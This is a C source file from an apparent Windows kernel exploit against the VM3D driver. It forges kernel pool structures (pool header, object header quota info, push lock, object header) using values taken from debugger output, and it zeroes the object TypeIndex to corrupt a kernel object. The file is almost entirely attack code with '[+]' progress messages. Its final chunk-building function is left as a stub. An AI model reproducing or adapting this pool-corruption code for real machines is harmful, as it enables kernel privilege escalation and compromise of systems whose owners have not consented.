#include "exploit.h"

void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffb004f4040310

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0x40;					// +0x000 PoolIndex        : 0y01000000 (0x40)
	pool_header.BlockSize = 0x44;					// +0x002 BlockSize        : 0y01000100 (0x44)
	pool_header.PoolType = 0xBB;					// +0x002 PoolType         : 0y10111011 (0xbb)
	pool_header.Ulong1 = 0xBB444000;				// +0x000 Ulong1           : 0xbb444000
	pool_header.PoolTag = 0xFFFF9E00;				// +0x004 PoolTag          : 0xffff9e00
	pool_header.ProcessBilled = 0;					// +0x008 ProcessBilled    : 0xffffb004`f9f489f0 _EPROCESS
	pool_header.AllocatorBackTraceIndex = 0x89F0;	// +0x008 AllocatorBackTraceIndex : 0x89f0
	pool_header.PoolTagHash = 0xF9F4;				// +0x00a PoolTagHash      : 0xf9f4

	*input_pool_header = pool_header;
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA_INFO input_object_header_quota)
{
	OBJECT_HEADER_QUOTA_INFO object_header_quota_info = *input_object_header_quota;	// dt nt!_OBJECT_HEADER_QUOTA_INFO ffffb004f4040310+8

	object_header_quota_info.PagedPoolCharge = 0xF9F489F0;							// +0x000 PagedPoolCharge  : 0xf9f489f0
	object_header_quota_info.NonPagedPoolCharge = 0xFFFFB004;						// +0x004 NonPagedPoolCharge : 0xffffb004
	object_header_quota_info.SecurityDescriptorCharge = 0;							// +0x008 SecurityDescriptorCharge : 0
	object_header_quota_info.Reserved1 = 0;											// +0x00c Reserved1        : 0
	object_header_quota_info.SecurityDescriptorQuotaBlock = 0x4100005D61E80000;		// +0x010 SecurityDescriptorQuotaBlock : 0x4100005d`61e80000 Void
	object_header_quota_info.Reserved2 = 0x52544C4602030100;						// +0x018 Reserved2        : 0x52544c46`02030100

	*input_object_header_quota = object_header_quota_info;
}

void initialize_ex_push_lock(PEX_PUSH_LOCK input_ex_push_lock)
{
	EX_PUSH_LOCK ex_push_lock = *input_ex_push_lock;// dx -id 0,0,ffffb004f3661040 -r1 (*((ntkrnlmp!_EX_PUSH_LOCK *)0xffffb004f4040338))

	ex_push_lock.Locked = 0x1;						// [+0x000 ( 0: 0)] Locked           : 0x1 [Type: unsigned __int64]
	ex_push_lock.Waiting = 0x1;						// [+0x000 ( 1: 1)] Waiting          : 0x1 [Type: unsigned __int64]
	ex_push_lock.Waking = 0x1;						// [+0x000 ( 2: 2)] Waking           : 0x1 [Type: unsigned __int64]
	ex_push_lock.MultipleShared = 0x1;				// [+0x000 ( 3: 3)] MultipleShared   : 0x1 [Type: unsigned __int64]
	ex_push_lock.Shared = 0x3B4100000181840;		// [+0x000 (63: 4)] Shared           : 0x3b4100000181840 [Type: unsigned __int64]
	ex_push_lock.Value = 0x3b4100000181840f;		// [+0x000] Value            : 0x3b4100000181840f [Type: unsigned __int64]
	ex_push_lock.Ptr = (void*)0x3b4100000181840f;	// [+0x000] Ptr              : 0x3b4100000181840f [Type: void *]

	*input_ex_push_lock = ex_push_lock;
}

void initialize_quad(PQUAD input_quad)
{
	QUAD quad = *input_quad;													// dx -id 0,0,ffffb004f3661040 -r1 (*((ntkrnlmp!_QUAD *)0xffffb004f4040358))

	quad.UseThisFieldToCopy = 5242189969409114112;								// [+0x000] UseThisFieldToCopy : 5242189969409114112 [Type: __int64]
	quad.DoNotUseThisField = 2787595099483233453312435956434522307821568.000000;// [+0x000] DoNotUseThisField : 2787595099483233453312435956434522307821568.000000 [Type: double]

	*input_quad = quad;
}

// In the VM3D pool chunk structures, it appears that the OBJECT_CREATE_INFORMATION structure is unused.
// We will keep this here incase anyone would like to use it for anything.
void initialize_object_create_information(POBJECT_CREATE_INFORMATION input_object_create_information)
{
	OBJECT_CREATE_INFORMATION object_create_information = *input_object_create_information;

	*input_object_create_information = object_create_information;
}

void initialize_object_header(POBJECT_HEADER input_object_header, PEX_PUSH_LOCK input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information)
{
	OBJECT_HEADER object_header = *input_object_header;		// dt nt!_OBJECT_HEADER ffffb004f4040310+8+10

	object_header.PointerCount = 4683744013539868672;		// +0x000 PointerCount     : 0n4683744013539868672
	object_header.HandleCount = 5932450472718958848;		// +0x008 HandleCount      : 0n5932450472718958848
	object_header.NextToFree = (void*)0x52544c4602030100;	// +0x008 NextToFree       : 0x52544c46`02030100 Void
	object_header.Lock = *input_ex_push_lock;				// +0x010 Lock             : _EX_PUSH_LOCK
	object_header.TypeIndex = 0;							// +0x018 TypeIndex        : 0x1 '' (Overwritten with 0)
	object_header.TraceFlags = 0;							// +0x019 TraceFlags       : 0 ''
	object_header.DbgRefTrace = 0;							// +0x019 DbgRefTrace      : 0y0
	object_header.DbgTracePermanent = 0;					// +0x019 DbgTracePermanent : 0y0
	object_header.InfoMask = 0;								// +0x01a InfoMask         : 0 ''
	object_header.Flags = 0;								// +0x01b Flags            : 0 ''
	object_header.NewObject = 0;							// +0x01b NewObject        : 0y0
	object_header.KernelObject = 0;							// +0x01b KernelObject     : 0y0
	object_header.KernelOnlyAccess = 0;						// +0x01b KernelOnlyAccess : 0y0
	object_header.ExclusiveObject = 0;						// +0x01b ExclusiveObject  : 0y0
	object_header.PermanentObject = 0;						// +0x01b PermanentObject  : 0y0
	object_header.DefaultSecurityQuota = 0;					// +0x01b DefaultSecurityQuota : 0y0
	object_header.SingleHandleEntry = 0;					// +0x01b SingleHandleEntry : 0y0
	object_header.DeletedInline = 0;						// +0x01b DeletedInline    : 0y0
	object_header.Reserved = 0x20001;						// +0x01c Reserved         : 0x20001
	object_header.ObjectCreateInfo = 0;						// +0x020 ObjectCreateInfo : (null)
	object_header.QuotaBlockCharged = 0;					// +0x020 QuotaBlockCharged : (null)
	object_header.SecurityDescriptor = 0;					// +0x028 SecurityDescriptor : (null)
	object_header.Body = *input_quad;						// +0x030 Body             : _QUAD

	*input_object_header = object_header;
}

void initialize_main_pool_structs(char* address, PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA_INFO input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information, POBJECT_HEADER input_object_header)
{
	initialize_pool_header(input_pool_header);
	printf("\n[+] Initialized fake pool header.");

	initialize_object_header_quota(input_object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_ex_push_lock(input_push_lock);
	printf("\n[+] Initialized fake push lock.");

	initialize_quad(input_quad);
	printf("\n[+] Initialized fake quad.");

	initialize_object_create_information(input_object_create_information);
	printf("\n[+] Initialized fake object create information.");

	initialize_object_header(input_object_header, input_push_lock, address, input_quad, input_object_create_information);
	printf("\n[+] Initialized fake object header.");
}

void build_pool_chunk(char* fake_pool_memory_page, POOL_HEADER pool_header, OBJECT_HEADER_QUOTA_INFO object_header_quota_info, OBJECT_HEADER object_header)
{
	// ...
}